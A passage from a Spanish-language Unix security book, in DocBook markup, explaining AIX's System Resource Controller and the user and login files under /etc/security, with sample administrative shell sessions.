&#x00A0;&#x00A0;rwhod&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;iptrace&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;timed&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;dhcpcd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;dhcpsd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;dhcprd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;ndpd-host&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;ndpd-router&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;llbd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;iforncs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;glbd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;iforncs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;i4lmd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;iforls&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;i4glbcd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;iforncs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;i4gdb&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;iforls&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;i4llmd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;iforls&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;mrouted&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;rsvpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;qos&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;policyd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;qos&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;pxed&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;binld&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative

&#x00A0;&#x00A0;dtsrc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;bruja:/#
</literallayout>
<figure><title/><blockquote>
<section role="center"><title/>
<!--l. 214--><para>            ___________ 
    ______________________________ 
        ____________________ 
          ________________ 
                 ?
                 ?
                 ?
 ________________________________________________ GRUPOS DE SUBSISTEMASSISTEMA
         SUBSERVIDORESSUBSISTEMAS                    (bruja)
                                              (tcpip)
                                              (inetd)
                                         (telnetd, ftpd...)
</para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1610011"  ></anchor>Figura&#x00A0;11.1</title><para>Estructura jer&#x00E1;rquica del SRC.</para></blockquote>
</blockquote></figure> Los subsistemas con funciones relacionadas entre s&#x02CA;&#x0131; forman lo que se denomina grupos de subsistemas,
y adem&#x00E1;s cada subsistema se divide en subservidores (simples programas o procesos), formando una
estructura jer&#x00E1;rquica como la mostrada en la &#xFB01;gura  <ulink 
  url="#x1-1610011"  ><!--ref: subsystem--></ulink> (&#xFB01;gura en la que adem&#x00E1;s se muestra un ejemplo &#x2013; entre
par&#x00E9;ntesis &#x2013; de cada categor&#x02CA;&#x0131;a); como podemos ver en ella, un grupo de subsistemas es tcpip, que como su
nombre ya adelanta es el encargado de la gesti&#x00F3;n de protocolos TCP/IP, y que incluye a subsistemas tan
importantes como inetd o snmpd. Mediante lssrc, con las opciones adecuadas, podemos obtener
informaci&#x00F3;n detallada acerca de un subsistema o subservidor; por ejemplo, la siguiente orden nos
muestra lo que hemos comentado anteriormente, que el subsistema inetd pertenece al grupo
tcpip, y que en este caso concreto tiene cuatro servidores activos (tftp, klogin, kshell y
ftp):

     <literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lssrc&#x00A0;-ls&#x00A0;inetd
&#x00A0;Subsystem&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Group&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PID&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Status
&#x00A0;&#x00A0;inetd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;7770&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;
&#x00A0;Debug&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Not&#x00A0;active
&#x00A0;
&#x00A0;Signal&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Purpose
&#x00A0;&#x00A0;SIGALRM&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Establishes&#x00A0;socket&#x00A0;connections&#x00A0;for&#x00A0;failed&#x00A0;services.
&#x00A0;&#x00A0;SIGHUP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Rereads&#x00A0;the&#x00A0;configuration&#x00A0;database&#x00A0;and&#x00A0;reconfigures&#x00A0;services.
&#x00A0;
&#x00A0;&#x00A0;SIGCHLD&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Restarts&#x00A0;the&#x00A0;service&#x00A0;in&#x00A0;case&#x00A0;the&#x00A0;service&#x00A0;ends&#x00A0;abnormally.
&#x00A0;
&#x00A0;Service&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Command&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Description&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Status
&#x00A0;&#x00A0;tftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/tftpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tftpd&#x00A0;-d&#x00A0;/tftpboot&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;klogin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/krlogind&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;krlogind&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;kshell&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/krshd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;krshd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/ftpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;
&#x00A0;bruja:/#
</literallayout>
<!--l. 282--><para>Como ya hemos dicho antes, el SRC proporciona comandos comunes para operar con todos sus subsistemas:
disponemos de las &#x00F3;rdenes startsrc y stopsrc para arrancar y detener &#x2013; respectivamente &#x2013; tanto
subsistemas completos como subservidores de los mismos de forma independiente, y de traceson y
tracesoff para activar o desactivar el trazado de los mismos; la orden refresh &#x2018;refresca&#x2019; un subsistema
(algo similar a enviarle una se~nal SIGHUP), mientras que mediante lssrc podemos consultar el estado de
un subsistema. Por ejemplo, para detener el subservidor telnetd en nuestro sistema no tenemos que
recurrir &#x2013; aunque podr&#x02CA;&#x0131;amos hacerlo &#x2013; a chsubserver (como vimos al inicio de este punto aplicando el
ejemplo al subservidor chargen); una forma equivalente de hacerlo es simplemente ejecutando la siguiente
orden:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;startsrc&#x00A0;-t&#x00A0;telnet
&#x00A0;0513-124&#x00A0;The&#x00A0;telnet&#x00A0;subserver&#x00A0;has&#x00A0;been&#x00A0;started.
&#x00A0;bruja:/#&#x00A0;grep&#x00A0;-w&#x00A0;telnet&#x00A0;/etc/inetd.conf
&#x00A0;telnet&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp6&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/telnetd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;telnetd&#x00A0;-a
&#x00A0;bruja:/#&#x00A0;stopsrc&#x00A0;-t&#x00A0;telnet
&#x00A0;0513-127&#x00A0;The&#x00A0;telnet&#x00A0;subserver&#x00A0;was&#x00A0;stopped&#x00A0;successfully.
&#x00A0;bruja:/#&#x00A0;grep&#x00A0;-w&#x00A0;telnet&#x00A0;/etc/inetd.conf
&#x00A0;#telnet&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp6&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/telnetd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;telnetd&#x00A0;-a
&#x00A0;bruja:/#
</literallayout>
<!--l. 307--><para>
  </para></section><!--end section--><!--l. 307--><section 
role="section"><title><abbrev role="title-mark">11.4</abbrev><anchor 
   id="x1-16200011.4"  ></anchor>Usuarios y accesos al sistema</title>
<!--l. 308--><para>  Como vamos a ver en esta secci&#x00F3;n, AIX ofrece un sistema de control de accesos y gesti&#x00F3;n de usuarios
realmente interesante; al igual que en cualquier entorno Unix, nada m&#x00E1;s instalar el operativo ya existen una
serie de usuarios &#x2018;del sistema&#x2019; (root, daemon, sys&#x2026;). Todos ellos tienen en realidad las cuentas bloqueadas
ya que el campo reservado a su contrase~na en /etc/security/passwd es un asterisco, aunque una orden
como &#x2018;lsuser&#x2019; nos diga lo contrario:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;account&#x005F;locked&#x00A0;ALL
&#x00A0;root&#x00A0;account&#x005F;locked=false
&#x00A0;daemon&#x00A0;account&#x005F;locked=false
&#x00A0;bin&#x00A0;account&#x005F;locked=false
&#x00A0;sys&#x00A0;account&#x005F;locked=false
&#x00A0;adm&#x00A0;account&#x005F;locked=false
&#x00A0;uucp&#x00A0;account&#x005F;locked=false
&#x00A0;guest&#x00A0;account&#x005F;locked=false
&#x00A0;nobody&#x00A0;account&#x005F;locked=false
&#x00A0;lpd&#x00A0;account&#x005F;locked=false
&#x00A0;imnadm&#x00A0;account&#x005F;locked=false
&#x00A0;nuucp&#x00A0;account&#x005F;locked=false
&#x00A0;bruja:/#
</literallayout>
<!--l. 332--><para>Si necesitamos que la cuenta de un determinado usuario se bloquee temporalmente pero no
queremos sustituir su clave del &#xFB01;chero de contrase~nas por un asterisco, podemos ejecutar la orden
&#x2018;chuser&#x2019; <anchor 
   id="x1-162001f1"  ></anchor><footnote><para>   Es necesario recordar una vez m&#x00E1;s que en AIX, a diferencia de otros Unices, vi no es ninguna herramienta
administrativa.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;account&#x005F;locked&#x00A0;toni
&#x00A0;toni&#x00A0;account&#x005F;locked=false
&#x00A0;bruja:/#&#x00A0;chuser&#x00A0;account&#x005F;locked=true&#x00A0;toni
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;account&#x005F;locked&#x00A0;toni
&#x00A0;toni&#x00A0;account&#x005F;locked=true
&#x00A0;bruja:/#
</literallayout>
<!--l. 348--><para>La gesti&#x00F3;n y el control de los accesos al sistema por parte de usuarios se puede llevar a cabo desde diferentes
&#xFB01;cheros del directorio /etc/security/: por ejemplo, en el archivo user se de&#xFB01;nen los diferentes atributos
de cada usuario del sistema, desde las propiedades de envejecimiento de su contrase~na a las franjas
horarias en que el usuario pueden acceder a la m&#x00E1;quina; vamos a ver en los siguientes puntos algunos de
estos archivos, interesantes para de&#xFB01;nir o re&#xFB01;nar par&#x00E1;metros relacionados con la seguridad de nuestro
sistema.
  </para><!--l. 356--><section 
role="subsection"><title><abbrev role="title-mark">11.4.1</abbrev><anchor 
   id="x1-16300011.4.1"  ></anchor>El &#xFB01;chero /etc/security/.ids</title>
<!--l. 357--><para>  El nombre de este archivo quiz&#x00E1;s nos puede inducir a pensar que se trata de algo relacionado con la
detecci&#x00F3;n de intrusos en nuestra m&#x00E1;quina; nada m&#x00E1;s lejos de la realidad: en el &#xFB01;chero .ids se almacena
informaci&#x00F3;n necesaria para generar correctamente a nuevos usuarios. Su formato es similar al
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/etc/security#&#x00A0;cat&#x00A0;.ids
&#x00A0;8&#x00A0;210&#x00A0;11&#x00A0;205
&#x00A0;bruja:/etc/security#
</literallayout>
<!--l. 369--><para>Donde &#x2018;8&#x2019; y &#x2018;11&#x2019; indican los siguientes UID y GID (respectivamente) disponibles para usuarios con
privilegios administrativos, mientras que &#x2018;210&#x2019; y &#x2018;205&#x2019; son equivalentes pero para usuarios sin dichos
privilegios.
<!--br/-->
<!--br/-->A no ser que conozcamos muy bien el sistema, no es recomendable modi&#xFB01;car manualmente este archivo, ya
que las herramientas de gesti&#x00F3;n de usuarios lo actualizan de forma autom&#x00E1;tica; de cualquier
forma, aqu&#x02CA;&#x0131; lo citamos para evitar confusiones con su nombre, como hemos comentado al
principio.
  </para></section><!--end subsection--><!--l. 377--><section 
role="subsection"><title><abbrev role="title-mark">11.4.2</abbrev><anchor 
   id="x1-16400011.4.2"  ></anchor>El &#xFB01;chero /etc/security/passwd</title>
<!--l. 378--><para>  Al contrario de lo que sucede con el archivo .ids, el nombre del &#xFB01;chero passwd no da lugar a
equivocaciones: se trata, evidentemente, de informaci&#x00F3;n sobre las claves de los usuarios del sistema. Esta
informaci&#x00F3;n puede estar desajustada con respecto a la contenida en /etc/passwd, por lo que es
recomendable ejecutar peri&#x00F3;dicamente &#x2013; al menos una vez al mes &#x2013; &#x00F3;rdenes como pwdck, usrck o grpck,
encargadas de veri&#xFB01;car, comparar y sincronizar la informaci&#x00F3;n de los usuarios (de&#xFB01;niciones, grupos y
autenticaci&#x00F3;n) en las diferentes tablas que AIX mantiene:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;pwdck&#x00A0;-y&#x00A0;ALL
&#x00A0;The&#x00A0;user&#x00A0;&#x0022;daemon&#x0022;&#x00A0;has&#x00A0;an&#x00A0;invalid&#x00A0;password&#x00A0;field&#x00A0;in&#x00A0;/etc/passwd.
&#x00A0;The&#x00A0;user&#x00A0;&#x0022;toni&#x0022;&#x00A0;has&#x00A0;an&#x00A0;invalid&#x00A0;password&#x00A0;field&#x00A0;in&#x00A0;/etc/passwd.
&#x00A0;bruja:/#&#x00A0;usrck&#x00A0;-n&#x00A0;ALL
&#x00A0;User&#x00A0;daemon&#x00A0;is&#x00A0;locked.
&#x00A0;User&#x00A0;bin&#x00A0;is&#x00A0;locked.
&#x00A0;User&#x00A0;sys&#x00A0;is&#x00A0;locked.
&#x00A0;User&#x00A0;nobody&#x00A0;is&#x00A0;locked.
&#x00A0;User&#x00A0;lpd&#x00A0;is&#x00A0;locked.
&#x00A0;User&#x00A0;imnadm&#x00A0;is&#x00A0;locked.
&#x00A0;bruja:/#
</literallayout>
<!--l. 401--><para>Tras sincronizar correctamente la informaci&#x00F3;n de los usuarios (par&#x00E1;metro &#x2018;-y&#x2019; de estas &#x00F3;rdenes), en
/etc/passwd nos encontraremos el car&#x00E1;cter &#x2018;!&#x2019; en el campo reservado a la contrase~na cifrada de cada
entrada, mientras que las claves reales ya estar&#x00E1;n en /etc/security/passwd. Este &#xFB01;chero ha de ser de s&#x00F3;lo
lectura para el administrador: es en cierta forma similar al /etc/shadow cl&#x00E1;sico de otros Unices; no
obstante, di&#xFB01;ere enormemente de &#x00E9;l en el formato del archivo, ya que no utiliza una entrada por l&#x02CA;&#x0131;nea con
los campos separados por el car&#x00E1;cter &#x2018;:&#x2019;. Por contra, en AIX cada usuario tiene de&#xFB01;nidos una serie de
campos, uno por l&#x02CA;&#x0131;nea, y con el identi&#xFB01;cador del campo y su contenido separados por un signo &#x2018;=&#x2019;; por
ejemplo, la entrada para el usuario &#x2018;oracle&#x2019; en /etc/security/passwd podr&#x02CA;&#x0131;a ser similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;oracle:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;password&#x00A0;=&#x00A0;be3a2NjB.dtbg
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;lastupdate&#x00A0;=&#x00A0;995301219
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;flags&#x00A0;=
</literallayout>
<!--l. 422--><para>El primer campo representa obviamente la contrase~na cifrada del usuario; el segundo representa el la fecha y
hora de la &#x00FA;ltima actualizaci&#x00F3;n del conjunto de atributos (denominado &#x2018;stanza&#x2019;) del usuario, y &#xFB01;nalmente el
campo &#x2018;flags&#x2019;, por defecto vac&#x02CA;&#x0131;o, puede contener una serie de par&#x00E1;metros caracter&#x02CA;&#x0131;sticos del usuario
concreto: si se trata de un usuario con cierto privilegio, si no necesita contrase~na para conectar al
sistema&#x2026;; para obtener m&#x00E1;s informaci&#x00F3;n sobre estos par&#x00E1;metros podemos consultar la p&#x00E1;gina del manual de
&#x2018;pwdck&#x2019;.
  </para></section><!--end subsection--><!--l. 430--><section 
role="subsection"><title><abbrev role="title-mark">11.4.3</abbrev><anchor 
   id="x1-16500011.4.3"  ></anchor>El &#xFB01;chero /etc/security/failedlogin</title>
<!--l. 431--><para>  Como su nombre indica, en este &#xFB01;chero se registran los intentos fallidos de acceso al sistema; su formato
no es de texto plano, sino que es similar a los &#xFB01;cheros wtmp de AIX y otros sistemas Unix. Por tanto, para
visualizar el contenido de este archivo necesitamos ejecutar &#x00F3;rdenes como &#x2018;last&#x2019; o &#x2018;who&#x2019; con los par&#x00E1;metros
adecuados:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;who&#x00A0;-s&#x00A0;/etc/security/failedlogin&#x00A0;|tail&#x00A0;-3
&#x00A0;oracle&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/24&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Sep&#x00A0;&#x00A0;5&#x00A0;12:55&#x00A0;&#x00A0;&#x00A0;&#x00A0;(luisa)
&#x00A0;UNKNOWN&#x005F;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dtlogin/&#x005F;0&#x00A0;&#x00A0;Sep&#x00A0;12&#x00A0;11:01
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/23&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Sep&#x00A0;13&#x00A0;15:45&#x00A0;&#x00A0;&#x00A0;&#x00A0;(anita)
&#x00A0;bruja:/#
</literallayout>
<!--l. 445--><para>
  </para></section><!--end subsection--><!--l. 445--><section 
role="subsection"><title><abbrev role="title-mark">11.4.4</abbrev><anchor 
   id="x1-16600011.4.4"  ></anchor>El &#xFB01;chero /etc/security/lastlog</title>
<!--l. 446--><para>  En el archivo /etc/security/lastlog de un sistema AIX, un &#xFB01;chero de texto plano que poco tiene que
ver con el formato del &#x2018;lastlog&#x2019; de otros Unices, se encuentra almacenada informaci&#x00F3;n relativa a la
&#x00FA;ltima conexi&#x00F3;n &#x2013; o intento de conexi&#x00F3;n &#x2013; de cada usuario de la m&#x00E1;quina; en concreto, aparecen
referencias a la hora, terminal y host origen de la &#x00FA;ltima entrada al sistema y del &#x00FA;ltimo intento de
acceso.
<!--br/-->
<!--br/-->Cuando un usuario es creado mediante mkuser (o equivalentemente, v&#x02CA;&#x0131;a SMIT) se crea una stanza vac&#x02CA;&#x0131;a
para el mismo en este archivo cuyos campos se ir&#x00E1;n rellenando a medida que el usuario acceda al sistema;
esta stanza puede ser similar a la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;toni:
